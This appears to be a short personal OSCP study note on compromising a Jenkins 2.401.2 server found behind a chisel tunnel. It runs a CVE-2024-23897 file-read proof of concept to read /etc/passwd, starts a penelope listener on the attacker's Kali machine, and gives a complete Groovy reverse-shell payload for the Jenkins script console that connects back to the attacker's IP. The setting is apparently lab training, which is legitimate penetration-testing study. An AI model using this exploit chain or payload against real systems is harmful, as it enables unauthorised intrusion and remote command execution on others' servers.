Hudson v2.401.2

Jenkins

After finding internal web server through chisel and finding jenkins page, use this CVE to find password to enter console

https://github.com/godylockz/CVE-2024-23897

```
python3 jenkins_fileread.py -u http://localhost:8888
```

```
file > /etc/passwd
```

Then use this guide to get reverse shell

https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6

ON KALI ATTACKER
```
cd ~/Desktop/Tools && python3 penelope.py -p 8044 -O / --oscp-safe
```

This command is to be pasted in the console
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `String host="${KaliIP}";int port=8044;String cmd="sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();`;

dv.paragraph("```bash\n" + command + "\n```");
```
